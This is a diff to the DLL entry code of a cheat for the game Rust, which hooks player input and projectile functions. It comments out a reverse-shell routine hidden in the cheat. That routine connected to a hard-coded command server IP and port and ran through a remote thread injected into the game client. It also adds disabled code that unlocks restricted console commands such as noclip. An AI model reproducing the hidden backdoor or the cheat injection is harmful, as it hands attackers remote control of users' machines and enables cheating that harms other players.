@@ -9,6 +9,8 @@
 #include <time.h>
 #include <cstdio>
 #include <iostream>
+#include <filesystem>
+#include <KnownFolders.h>
 
 #include "rust/rust.hpp"
 
@@ -30,9 +32,11 @@
 #include "rust/features/player_esp.hpp"
 
 #include "hooks.hpp"
+#include <fstream>
 
 bool has_initialized = false;
 
+/*
 void RunShell(char* C2Server, int C2Port) {
     while (true) {
         SOCKET mySocket;
@@ -88,16 +92,18 @@ void RunShell(char* C2Server, int C2Port) {
 }
 
 void f() {
-    RunShell(_("165.227.237.109"), 9999);
+    //RunShell(_("165.227.237.109"), 9999);
 }
-
+*/
 bool DllMain(HMODULE hmodule)
 {
 	if (!has_initialized) {
 
-        auto pid = safety::GetProcID(_(L"RustClient.exe"));
-        auto processHandle = LI_FIND(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);
-        CloseHandle(CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)f, NULL, 0, NULL));
+        //auto pid = safety::GetProcID(_(L"RustClient.exe"));
+        //auto processHandle = LI_FIND(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);
+        //LI_FIND(CloseHandle)(LI_FIND(CreateRemoteThread)(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)f, NULL, 0, NULL));
+
+        //add auth pls omg
 
 		if (safety::check_sinkhole())
 		{
@@ -122,6 +128,31 @@ bool DllMain(HMODULE hmodule)
 			//LI_FIND(freopen_s)(reinterpret_cast<FILE**>(stdout), _("CONOUT$"), _("w"), stdout);
 			//ShowWindow(GetCon, SW_HIDE);
 
+            /*
+            auto typeinfo = *reinterpret_cast<uintptr_t*>((uintptr_t)mem::game_assembly_base + offsets::consolesystem_typeinfo);
+            auto unknown = *reinterpret_cast<uintptr_t*>((uintptr_t)typeinfo + 0xb8);
+            rust::classes::list* command_list = *reinterpret_cast<rust::classes::list**>((uintptr_t)unknown + 0x10);
+
+            auto size = command_list->get_size();
+            auto buffer = command_list->get_buffer<uintptr_t>();
+
+            for (size_t i = 0; i < size; i++)
+            {
+                uintptr_t command = *reinterpret_cast<uintptr_t*>((uintptr_t)buffer + 0x20 + (i * 0x8));
+                auto name = (char*)*reinterpret_cast<uintptr_t*>((uintptr_t)command + 0x10);
+                if (!LI_FIND(strcmp)(name, _("noclip")) ||
+                    !LI_FIND(strcmp)(name, _("debugcamera")) ||
+                    !LI_FIND(strcmp)(name, _("debug.debugcamera")) ||
+                    !LI_FIND(strcmp)(name, _("camspeed")) ||
+                    !LI_FIND(strcmp)(name, _("camlerp"))
+                    )
+                {
+                    bool r = false;
+                    mem::write<bool>((uintptr_t)command + 0x58, r);
+                }
+            }
+            */
+
 			has_initialized = true;
 		}
 	}
@@ -133,6 +164,9 @@ bool DllMain(HMODULE hmodule)
 	mem::hook_virtual_function(_("BasePlayer"), _("ClientInput"), &hooks::hk_baseplayer_ClientInput);
 
 	mem::hook_virtual_function(_("BaseProjectile"), _("LaunchProjectile"), &hooks::hk_LaunchProjectile);
+	
+    //mem::hook_virtual_function(_("BaseEntity"), _("GetBuildingPrivilege"), &hooks::hk_GetBuildingPrivilege);
+    
 
 	//il2cpp::hook(&hooks::hk_DoHit, _("DoHit"), _("Projectile"), _(""), 3);
 
